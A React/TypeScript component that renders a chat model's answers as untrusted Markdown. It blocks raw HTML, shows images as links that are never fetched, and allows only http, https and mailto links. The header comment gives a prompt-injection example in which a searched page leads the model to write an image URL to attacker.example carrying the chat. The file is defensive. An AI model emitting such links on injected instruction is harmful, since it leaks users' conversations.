/**
 * An answer, as Markdown, treated as untrusted (workbench-v1.md W5).
 *
 * - No raw HTML: `react-markdown` without `rehype-raw` renders HTML in an
 *   answer as the text it is. Four tags with no attributes (`<br>`, `<sub>`,
 *   `<sup>`, `<kbd>`) are read as the Markdown they stand for
 *   (lib/markdownPlugins.ts); every other tag is dropped.
 * - **An image an answer names is shown as a link, never fetched.** A page
 *   the model read in a search can tell it to write
 *   `![](https://attacker.example/?q=<the chat>)`, and rendering that image
 *   would send the chat away. The page's Content Security Policy refuses
 *   the fetch as well; this is the first lock on the same door.
 * - Only http, https and mailto links are links, opened in a new tab with
 *   no opener and no referrer.
 *
 * How it reads is the stylesheet's (`.answer`, styles.css); the parts that
 * need an element of their own are made here: the code block (language and
 * Copy joined to the code), the table's scrolling box, the lead-in, the task
 * box (workbench-reading.md 6.3).
 */

import { Children, isValidElement, memo, type ReactNode } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import remarkBreaks from "remark-breaks";
import remarkGfm from "remark-gfm";
import { colourCode } from "../lib/highlight";
import { rehypeOpenFences, remarkAlerts, remarkAllowedHtml } from "../lib/markdownPlugins";
import { CopyButton } from "./CopyButton";

const SAFE = /^(https?:|mailto:)/i;

export function safeHref(href: string | undefined | null): string | null {
  if (!href) return null;
  const trimmed = href.trim();
  return SAFE.test(trimmed) ? trimmed : null;
}

type CodeProps = { className?: string; children?: ReactNode; "data-fence"?: string };

/**
 * A code block: its language and Copy joined to the code in one box, and the
 * code coloured once its fence has closed. Memoised on what it is shown from,
 * three strings and a flag: a streamed answer renders on every token, and a
 * block above the text being written has long stopped changing, so React skips
 * it (turning 300 lines of coloured tokens into elements and comparing them
 * took 70 ms a token here).
 */
const Block = memo(function Block({
  language,
  source,
  open,
}: {
  language: string | null;
  source: string;
  open: boolean;
}) {
  // The colour waits for the fence to close, and a block that cannot be coloured
  // (no language, a plain one, one this page does not know, past the size cap)
  // is its text.
  const coloured = language && !open ? colourCode(language, source) : null;
  const named = language ? `language-${language}` : undefined;
  return (
    <div className="code-block">
      <div className="code-head">
        <span className="code-lang">{language ?? "code"}</span>
        <CopyButton text={source} label="code" />
      </div>
      {/* A focusable scroller, so a keyboard can reach code wider than its box. */}
      <pre tabIndex={0} aria-label={`${language ?? "Code"} block`}>
        <code className={coloured ? `hljs ${named}` : named}>{coloured ?? source}</code>
      </pre>
    </div>
  );
});

function CodeBlock({ children }: { children: ReactNode }) {
  const code = Children.toArray(children)[0];
  if (!isValidElement<CodeProps>(code)) {
    return <Block language={null} source={textOf(children)} open={false} />;
  }
  // The language as the fence wrote it ("bash", "py"); none when it wrote none.
  const language = /language-([\w#+.-]+)/.exec(code.props.className ?? "")?.[1] ?? null;
  return (
    <Block
      language={language}
      source={textOf(code.props.children)}
      open={code.props["data-fence"] === "open"}
    />
  );
}

function textOf(node: ReactNode): string {
  if (node == null || typeof node === "boolean") return "";
  if (typeof node === "string" || typeof node === "number") return String(node);
  if (Array.isArray(node)) return node.map(textOf).join("");
  if (typeof node === "object" && "props" in node) {
    return textOf((node as { props: { children?: ReactNode } }).props.children);
  }
  return "";
}

const components: Components = {
  img({ src, alt }) {
    const href = safeHref(typeof src === "string" ? src : null);
    const label = alt ? `Image: ${alt}` : "Image";
    if (!href) return <span className="text-muted">[{label}]</span>;
    return (
      <a
        href={href}
        target="_blank"
        rel="noopener noreferrer"
        title="Not shown here: open it yourself if you trust it"
      >
        [{label}]
      </a>
    );
  },
  a({ href, children }) {
    const safe = safeHref(href);
    if (!safe) return <span>{children}</span>;
    return (
      <a href={safe} target="_blank" rel="noopener noreferrer">
        {children}
      </a>
    );
  },
  pre({ children }) {
    return <CodeBlock>{children}</CodeBlock>;
  },
  // A wide table scrolls inside its own box, not the answer; the wrapper (and
  // not `display: block` on the table) keeps it a table to a screen reader.
  table({ children }) {
    return (
      <div className="table-wrap">
        <table>{children}</table>
      </div>
    );
  },
  // "Why:", "Risks:", "Note:": a short bold label ending in a colon is a
  // label, and takes the heading's colour.
  strong({ children }) {
    const label = textOf(children).trim();
    const leadIn = label.length > 0 && label.length <= 48 && /[:：]$/.test(label);
    return <strong className={leadIn ? "lead-in" : undefined}>{children}</strong>;
  },
  // The browser's disabled checkbox is 13 px, 1.5 to 1.6:1 against the page
  // and has no name. A drawn box says the same thing and the words are for a
  // screen reader.
  input({ checked, type }) {
    if (type !== "checkbox") return null;
    return (
      <>
        <span className="task-box" aria-hidden="true" data-checked={checked ? "true" : "false"} />
        <span className="sr-only">{checked ? "Done: " : "Not done: "}</span>
      </>
    );
  },
};

// At module scope: react-markdown builds its processor on every render, and a
// streamed answer renders on every chunk.
const remarkPlugins = [remarkGfm, remarkAllowedHtml, remarkAlerts, remarkBreaks];
const rehypePlugins = [rehypeOpenFences];

/**
 * `quiet` is for a draft the model wrote before a search or a tool call: it
 * sits in a muted box at the chrome's size, and its text keeps that size.
 *
 * Memoised, because its props are a string and a flag: a streamed answer
 * changes the page on every token, and only the answer being written should
 * be parsed again, not every finished one above it in the thread.
 */
export const Markdown = memo(function Markdown({
  text,
  quiet = false,
}: {
  text: string;
  quiet?: boolean;
}) {
  return (
    <div className={quiet ? "answer answer-quiet" : "answer"}>
      <ReactMarkdown
        remarkPlugins={remarkPlugins}
        rehypePlugins={rehypePlugins}
        components={components}
        skipHtml
      >
        {text}
      </ReactMarkdown>
    </div>
  );
});
